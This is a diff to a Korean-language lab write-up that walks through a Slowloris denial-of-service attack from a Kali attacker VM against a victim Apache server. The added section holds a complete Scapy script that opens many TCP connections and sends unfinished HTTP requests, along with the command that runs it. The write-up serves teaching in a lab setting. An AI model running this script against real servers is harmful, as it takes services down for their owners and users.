@@ -38,7 +38,7 @@
 
 <br>
 
-**Step 2. Attacker 가상머신에서 브라우저로 Victim 가상머신의 아파치로 접속**
+**Step 2. Attacker 에서 브라우저로 Victim의 아파치로 접속**
 
 ![slowloris0](https://user-images.githubusercontent.com/76420201/106067998-21a38600-6143-11eb-91ae-2e60f826c0fe.jpg)
 
@@ -55,6 +55,65 @@
 <br>
 
 **Step 3. Attacker 가상머신에서 Slowloris.py를 생성**
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cd      
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ code slowloris.py
+```
+
+파이썬 파일을 작성후 저장
+```
+# python3 slowloris.py TARGET_IP TARGET_PORT NO_OF_GETS
+#                      공격대상웹서버주소 공격대상웹서버서비스포트 동시공격개수
+# 파라미터의 개수를 확인
+if len(sys.argv) != 4:
+    print("Invalid Parameter")
+    sys.exit(1)
+
+# 입력 파라미터를 변수에 할당
+target_ip = sys.argv[1]
+target_port = int(sys.argv[2])
+no_of_gets = int(sys.argv[3])
+
+# IP 설정
+ip = IP()
+ip.dst = target_ip
+
+# 동시공격회수에 맞춰서 3 way handshaking 및 완료되지 않은 HTTP 요청을 전송
+for s in range(0, no_of_gets):
+    tcp = TCP()
+    tcp.dport = target_port                       # 연결 요청(SYN)
+    tcp.sport = RandNum(1024, 65535)
+    tcp.flags = 'S'
+
+    syn = ip / tcp
+    syn_ack = sr1(syn)                            # 연결 승락(SYN/ACK) 
+
+    get = "GET / HTTP/1.1\r\nHost: " + target_ip  # 요청 헤더가 완료되지 않은 HTTP 요청
+                                                  # GET / HTTP/1.1↳
+                                                  # Host: 192.168.94.133   ⇐ 개행문자가 누락
+    ack_get = ip                            \     # 연결 승락 확인(ACK) 및 요청(GET)을 전달
+            / TCP(dport=target_port,        \     
+                  sport=syn_ack[TCP].dport, \
+                  flags="A",                \
+                  seq=syn_ack[TCP].ack,     \
+                  ack=syn_ack[TCP].seq+1)   \
+            / get
+    print(ack_get.summary())
+    sr1(ack_get)
+```
+
+파이썬 파일 실행
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 slowloris.py victim 80 1000
+```
 
 <br>
 
